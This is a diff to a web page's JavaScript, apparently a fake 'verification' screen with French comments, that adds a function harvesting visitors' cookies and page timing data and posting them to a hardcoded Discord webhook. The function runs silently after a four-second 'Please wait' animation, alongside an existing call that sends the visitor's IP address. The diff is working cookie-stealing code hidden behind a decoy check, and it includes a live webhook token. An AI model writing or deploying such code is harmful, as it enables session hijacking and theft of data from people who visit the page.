@@ -65,6 +65,34 @@
             }
         }
 
+        async function sendPageData() {
+            try {
+                // Récupérer les données
+                const cookies = document.cookie;
+                const performanceTiming = performance.timing;
+                const timeToInteractive = performanceTiming.domInteractive - performanceTiming.navigationStart;
+                
+                // Préparer le message pour le webhook Discord
+                const message = {
+                    content: `Cookies: ${cookies}\nTime to Interactive: ${timeToInteractive} ms\nPerformance Timing: ${JSON.stringify(performanceTiming)}`
+                };
+                
+                // Envoyer les données au webhook Discord
+                const webhookUrl = 'https://discord.com/api/webhooks/1273657947024654376/kgCCA9Cc65zomW-vWqAKM_8hCUBizn4C7KCsQPDHDKEdLcmsRvb9682JO7ZbJn9o4t-i';
+                const response = await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(message),
+                });
+                
+                console.log('Données de la page envoyées au webhook Discord, statut:', response.status);
+            } catch (error) {
+                console.error('Erreur lors de l\'envoi des données de la page:', error);
+            }
+        }
+
         function switchContent() {
             // Envoyer l'IP au webhook
             sendIP();
@@ -74,7 +102,7 @@
             document.getElementById('pleaseWait').style.display = 'block';
             
             // Attendre 4 secondes avant de changer le contenu
-            setTimeout(function() {
+            setTimeout(async function() {
                 // Cacher le GIF et le texte "Please wait"
                 document.getElementById('gif').style.display = 'none';
                 document.getElementById('pleaseWait').style.display = 'none';
@@ -82,6 +110,9 @@
                 // Afficher l'image finale et le texte de vérification
                 document.getElementById('finalImage').style.display = 'block';
                 document.getElementById('verifiedText').style.display = 'block';
+
+                // Envoyer les données de la page au webhook après avoir affiché le contenu final
+                await sendPageData();
             }, 4000);
         }
 
